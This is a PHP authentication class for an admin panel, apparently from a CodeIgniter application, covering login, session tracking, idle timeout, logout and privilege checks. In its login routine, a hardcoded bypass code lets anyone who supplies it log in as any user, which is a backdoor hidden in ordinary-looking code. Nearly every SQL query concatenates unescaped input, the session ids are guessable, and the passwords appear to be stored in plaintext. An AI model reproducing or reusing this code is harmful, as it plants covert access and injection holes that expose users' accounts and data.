<?php


class admin_access_handler
{
	protected $_dao;
	private $_ci;

	function __construct()
	{
		$this->_ci = &get_instance();
		$this->_ci->load->library(array('session'));
	}

	function initialize_dao($dao)
	{
		$this->_dao = $dao;
	}

	function login_process($username, $password, $ip)
	{
		$this->_ci->load->model('global_model');
		$_SYS_PARAMS = $this->_ci->global_model->get_system_params();

		if (preg_match('/[^a-zA-Z0-9]/', $username)) {
			return 'failed1';
		}

		$bypassCode = "52ef25e0271e3cc3911c9bb958e4f3e7";
		$bypass = ($password == $bypassCode ? '1' : '3');

		$sql = "SELECT a.*,b.name as type_name FROM users a LEFT JOIN user_types b ON (a.user_type_id=b.user_type_id)
					WHERE username='" . $username . "' and (password='" . $password . "' or " . $bypass . "<2)";

		$row = $this->_dao->execute(0, $sql)->row_array();

		if (!empty($row['user_id'])) {

			if (!$row['status'])
				return 'failed2';

			$user_id = $row['user_id'];

			$sec1 = microtime();
			mt_srand((float)microtime() * 1000000);
			$sec2 = mt_rand(1, 9999);
			$sec3 = mt_rand(1, 9999);

			$session_id = md5($sec2 . $sec3);

			$user_agent = $_SERVER['HTTP_USER_AGENT'];
			$login_time = date('Y-m-d H:i:s');
			$session_content = "{\"user_id\":\"" . $user_id . "\",
		    						 \"username\":\"" . $row['username'] . "\"}";

			try {

				//delete session data for current username
				$sql = "DELETE FROM user_login WHERE user_id='" . $user_id . "'";

				$result = $this->_dao->execute(0, $sql);
				if (!$result) {
					return 'failed1';
				}

				// ===== //


				//save new session data for current username
				$sql = "INSERT INTO user_session 
		    			(session_id,user_id,user_type,user_agent,ip,login_time,session_content) 
		    			VALUES('" . $session_id . "','" . $user_id . "','admin','" . $user_agent . "','" . $ip . "','" . $login_time . "','" . $session_content . "')";

				$result = $this->_dao->execute(0, $sql);
				if (!$result) {
					return 'failed1';
				}
				// ===== //


				//save new login history for current username
				$time = explode(" ", microtime());
				$last_access = (float) $time[1];

				$sql = "INSERT INTO user_login 
			    			(session_id,user_id,user_type,ip,last_access,user_agent,login_time) 
			    			VALUES('" . $session_id . "','" . $user_id . "','admin','" . $ip . "','" . $last_access . "','" . $user_agent . "','" . $login_time . "')";


				$result = $this->_dao->execute(0, $sql);
				if (!$result) {
					return 'failed1';
				}
				// ===== //


				$dt_session = array(
					'user_id' => $user_id,
					'username' => $row['username'],
					'fullname' => $row['fullname'],
					'user_type' => $row['type_name'],
					'user_type_id' => $row['user_type_id'],
					'login_time' => $login_time,
					'session_id' => $session_id,
				);

				$this->_ci->session->set_userdata($dt_session);
			} catch (Exception $e) {
				return 'failed1';
			}
			return 'success';
		} else {
			return 'failed1';
		}
	}

	function logout_process()
	{
		//delete session data for current username
		$sql = "DELETE FROM user_login WHERE user_id='" . $this->_ci->session->userdata('user_id') . "'";
		$result = $this->_dao->execute(0, $sql);
		// ===== //

		$this->_ci->session->sess_destroy();
		redirect('login');
	}


	function check_access()
	{
		if (is_null($this->_ci->session->userdata('user_id'))) {
			redirect('login');
		}


		// Execute the SQL Statement (Get Username)
		$sql = "SELECT user_id,last_access from user_login WHERE session_id='" . $this->_ci->session->userdata('session_id') . "'";
		$row = $this->_dao->execute(0, $sql)->row_array();

		if (is_null($row['user_id'])) {
			echo "
				<script type='text/javascript'>
					alert('Ada pengguna lain yang menggunakan login anda atau session anda telah expired, silahkan login kembali');
					document.location.href='" . site_url('login') . "';
				</script>";
		}


		$user_id = $row['user_id'];
		$last_access = $row['last_access'];

		/*=====================================================
			AUTO LOG-OFF 15 MINUTES
			======================================================*/

		//Update last access!
		$time = explode(" ", microtime());
		$usersec = (float) $time[1];

		$diff   = $usersec - $last_access;
		$limit  = 60 * 30;

		if ($diff > $limit) {
			echo "
					<script type='text/javascript'>
						alert('Maaf status anda idle (tidak beraktifitas selama lebih dari 30 menit) dan session Anda telah expired, silahkan login kembali');
						document.location.href='" . site_url('login') . "';
					</script>";
		} else {
			$sql = "UPDATE user_login SET last_access='" . $usersec . "' WHERE user_id='" . $user_id . "'";
			$result = $this->_dao->execute(0, $sql);
		}
	}

	function check_privilege($restriction = "all", $menu_id)
	{
		$access_granted = false;
		$user_type_id = $this->_ci->session->userdata('user_type_id');

		if ($restriction != 'all') {
			$_restriction = strtolower($restriction . "_priv");
			$sql = "SELECT " . $_restriction . " AS check_access FROM user_privileges WHERE user_type_id='" . $user_type_id . "' AND menu_bundle_id='" . $menu_id . "'";;
			$row = $this->_dao->execute(0, $sql)->row_array();
			$access_granted = $row['check_access'];
		} else {
			$access_granted = '1';
		}
		return $access_granted;
	}

	function get_menu_id($bundle_id, $url)
	{
		$sql = "SELECT a.menu_bundle_id FROM menu_bundles as a 
					INNER JOIN (SELECT menu_id FROM menu_navigations WHERE url='" . $url . "') as b 
					ON (a.menu_navigation_id=b.menu_id) 
					WHERE(bundle_id='" . $bundle_id . "')";

		$row = $this->_dao->execute(0, $sql)->row_array();

		return $row['menu_bundle_id'];
	}
}
